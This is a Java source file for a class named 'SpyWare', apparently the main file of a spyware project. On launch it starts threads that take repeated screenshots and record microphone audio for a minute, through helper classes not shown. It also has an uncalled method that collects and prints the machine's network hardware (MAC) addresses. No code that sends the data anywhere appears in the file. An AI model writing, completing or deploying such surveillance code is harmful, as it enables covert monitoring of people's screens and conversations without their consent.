import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;

public class SpyWare {

    private static final long RECORD_TIME = 60000;

    public static void main(String[] args) {
        screenshotThread();
        recorderThread();
    }

    public static void recorderThread() {
        AudioRecorder audioRecorder = new AudioRecorder();
        Runnable runnable = () -> audioRecorder.stopRecordingAudio(RECORD_TIME);
        Thread stopper = new Thread(runnable);
        stopper.start();
        audioRecorder.startRecording();
    }

    public static void screenshotThread() {
        Runnable runnable = Screenshot::multipleScreenShots;
        Thread screenShotThread = new Thread(runnable);
        screenShotThread.start();
    }

    public static void hardwareAddress() {
        try {
            Enumeration<NetworkInterface> networkInterfaces =
                    NetworkInterface.getNetworkInterfaces();

            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface ni = networkInterfaces.nextElement();
                byte[] hardwareAddress = ni.getHardwareAddress();

                if (hardwareAddress != null) {
                    String[] hexadecimalFormat =
                            new String[hardwareAddress.length];
                    for (int i = 0; i < hardwareAddress.length; i++) {
                        hexadecimalFormat[i] =
                                String.format("%02X", hardwareAddress[i]);
                    }
                    System.out.println(String.join("-",
                            hexadecimalFormat));
                }
            }
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }
}
